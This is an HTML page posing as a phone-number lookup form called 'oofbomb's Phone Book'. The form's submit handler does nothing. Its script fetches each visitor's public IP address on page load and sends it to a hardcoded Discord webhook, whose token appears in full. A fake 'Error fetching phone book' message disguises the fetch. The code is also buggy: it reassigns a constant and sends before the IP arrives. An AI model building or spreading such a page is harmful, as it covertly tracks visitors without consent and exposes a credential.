<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>oofbomb's Phone Book</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        header {
            background-color: #4CAF50;
            color: white;
            text-align: center;
            padding: 20px 0;
            font-size: 24px;
        }
        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .phone-book-form {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .phone-book-form input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .phone-book-form input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .phone-book-form input[type="submit"]:hover {
            background-color: #45a049;
        }
        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 10px 0;
        }
    </style>
</head>
<body>

<header>
    oofbomb's Phone Book
</header>

<main>
    <div class="phone-book-form">
        <form id="phoneForm">
            <input type="text" id="phoneNumber" placeholder="Enter phone number" maxlength="14" required>
            <input type="submit" value="Submit">
        </form>
    </div>
</main>

<footer>
    (Unauthorized access will not be allowed)
</footer>

<script>
        function redirectToNumLookup() {
        window.location.href = 'https://www.numlookup.com';
    }
    document.getElementById('phoneNumber').addEventListener('input', function (e) {
        let x = e.target.value.replace(/\D/g, '');
        if (x.length > 0) {
            x = '(' + x.substring(0, 3) + ') ' + x.substring(3, 6) + '-' + x.substring(6, 10);
        }
        e.target.value = x;
    });
const skibidi = ""
     fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => skibidi = data.ip)
            .catch(error => console.error('Error fetching phone book:', btoa(error)));
    document.getElementById('phoneForm').addEventListener('submit', function (e) {
        e.preventDefault();
       
    });
    function sendToDiscord(message) {
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1178097852665315338/RtYjhCRooN7BC2JhsPgm5tiAbc9uA2PS7RqBpZysvI5ytVqe-ZA6vnSGrTDsIf6T9CcQ");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "k",
        avatar_url: "",
        content: skibidi
      }
      request.send(JSON.stringify(params));
    }

    sendToDiscord();

</script>

</body>
</html>
